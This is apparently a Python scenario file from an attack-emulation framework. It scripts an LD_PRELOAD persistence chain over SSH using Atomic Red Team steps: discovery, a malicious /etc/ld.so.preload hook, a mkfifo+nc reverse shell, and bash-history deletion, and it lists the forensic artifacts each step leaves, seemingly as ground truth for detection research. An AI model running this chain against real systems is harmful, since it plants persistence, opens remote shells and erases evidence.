"""
orchestrator/attacks/scenario_01_ldpreload.py

Scenario 01 -- LD_PRELOAD infection via /etc/ld.so.preload

Attack narrative
----------------
The attacker gains initial SSH access as an unprivileged user.  They perform
system discovery, compile a malicious shared library that hooks getuid(3),
write it to /etc/ld.so.preload, then trigger the hook by spawning a new
process.  A reverse shell is established from inside that hooked process,
leaving the .so mapped in memory.  Cleanup optionally clears bash history.

Steps
-----
1. T1082        -- system info collection          (best-effort)
2. T1574.006    -- compile .so + write /etc/ld.so.preload
3. custom       -- spawn process, verify hook active in /proc/<pid>/maps
4. T1059.004    -- mkfifo+nc reverse shell (leaves socket + .so in memory)
5. cleanup only when run_cleanup=True:
   - plant bash history so T1070.003 has a file to remove
   - T1070.003  -- rm ~/.bash_history
   - T1574.006 ART cleanup -- remove /etc/ld.so.preload + .so

Forensic artifacts
------------------
Disk:
  /etc/ld.so.preload   written by step 2; removed by cleanup
  /tmp/T1574006.so     compiled .so;      removed by cleanup
  ~/.bash_history      present if cleanup NOT run; absent if cleanup IS run

Memory:
  any process spawned after step 2 has /tmp/T1574006.so mapped
  reverse shell process: open TCP socket + /tmp/T1574006.so in maps

Ground-truth shape
------------------
run() returns {"steps": [...]}.
The orchestrator stamps "scenario_id" on top.
"""

from __future__ import annotations

from typing import Any

from orchestrator.attacks.art_runner import ArtRunner
from orchestrator.attacks.helpers import (
    ArtStep,
    plant_history,
    run_art_cleanup,
    run_art_step,
    run_reverse_shell,
)
from orchestrator.core import console
from orchestrator.core.ssh_client import SSHClient

# --- ART step descriptors -----------------------------------------------

_DISCOVERY = ArtStep(
    name="discovery",
    technique="T1082",
    guid="cccb070c-df86-4216-a5bc-9fb60c74e27c",  # List OS Information
)

_LDPRELOAD = ArtStep(
    name="ldpreload",
    technique="T1574.006",
    guid="39cb0e67-dd0d-4b74-a74b-c072db7ae991",  # /etc/ld.so.preload
    has_prereq=True,
)

_CLEANUP_HISTORY = ArtStep(
    name="cleanup_history",
    technique="T1070.003",
    guid="a934276e-2be5-4a36-93fd-98adbb5bd4fc",  # rm ~/.bash_history
)


# --- public entry point -------------------------------------------------


def run(
    ssh: SSHClient,
    runner: ArtRunner,
    host_ip: str,
    internet_on,
    internet_off,
    *,
    run_cleanup: bool = False,
) -> dict[str, Any]:
    steps: list[dict[str, Any]] = []

    console.step_header("[1/4] discovery")
    steps.append(run_art_step(runner, _DISCOVERY))

    console.step_header("[2/4] LD_PRELOAD infection")
    steps.append(
        run_art_step(
            runner,
            _LDPRELOAD,
            internet_on=internet_on,
            internet_off=internet_off,
            raise_on_error=True,
        )
    )

    console.step_header("[3/4] LD_PRELOAD hook trigger")
    steps.append(_trigger_hook(ssh))

    console.step_header("[4/4] reverse shell")
    run_reverse_shell(ssh, host_ip, steps)

    if run_cleanup:
        console.step_header("cleanup")
        plant_history(ssh, steps)
        steps.append(run_art_step(runner, _CLEANUP_HISTORY))
        run_art_cleanup(runner, _LDPRELOAD, steps)
    else:
        console.step_header("cleanup (skipped: artifacts preserved)")
        steps.append({"step": "cleanup", "run": False})

    return {"steps": steps}


# --- scenario-local helpers ---------------------------------------------


def _trigger_hook(ssh: SSHClient) -> dict[str, Any]:
    code, out, _ = ssh.run("sh -c 'id'", timeout=10)
    # Constructor banner confirms the dynamic linker loaded the library.
    loaded = "Loaded Atomic Red Team Library" in out
    if loaded:
        console.ok("LD_PRELOAD .so confirmed loaded (constructor ran)", indent=True)
    else:
        console.warn(
            f"LD_PRELOAD .so constructor not observed: {out.strip()!r}", indent=True
        )
    return {
        "step": "ldpreload_trigger",
        "technique": "T1574.006",
        "exit_code": code,
        "id_output": out.strip(),
        "so_loaded": loaded,
    }
